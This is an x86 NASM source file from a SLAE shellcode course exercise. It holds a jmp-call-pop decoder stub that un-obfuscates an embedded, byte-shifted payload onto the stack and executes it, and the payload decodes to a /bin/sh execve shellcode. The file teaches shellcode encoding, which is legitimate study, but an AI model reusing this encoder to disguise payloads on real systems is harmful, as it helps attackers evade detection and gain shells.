;Filename: custom-decoder.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 4

global _start			

section .text
_start:

	jmp short call_shellcode
decoder:
	pop esi
	lea edi, [esi + 13]		;half of encoded shellcode
	xor ebx, ebx
	xor ecx, ecx
	mul ecx
	mov edx, esp
	mov cl, 13
decode: 
	mov bl, byte[esi]		;get value from esi
	dec ebx				;decrease by 1
	mov byte[edx + eax], bl
	inc eax
	mov bl, byte[edi]		;get value from edi
	dec ebx				;decrease by 1
	mov byte[edx + eax], bl
	inc eax
	inc esi
	inc edi
	loop decode

	jmp edx

call_shellcode:

	call decoder
	EncodedShellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
